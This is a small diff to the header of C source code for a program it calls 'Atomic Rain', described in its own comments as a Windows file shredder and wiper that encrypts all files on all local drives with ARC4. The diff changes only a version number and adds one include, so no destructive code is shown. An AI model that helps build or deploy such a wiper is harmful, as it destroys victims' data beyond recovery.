@@ -1,6 +1,6 @@
 /*
   Name:             Atora - Atomic Rain. Windows version.
-  Version:          5.56/01.06.20
+  Version:          5.57/01.06.20
   Compiler:         TCC ver 0.9.27
   Class:            Files shredder for Windows. Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
@@ -13,6 +13,7 @@
 #include <stdint.h>
 #include <stdlib.h>
 #include <stddef.h>
+#include <string.h>
 #include <windows.h>
 
 #define BUFFER_SIZE 8192
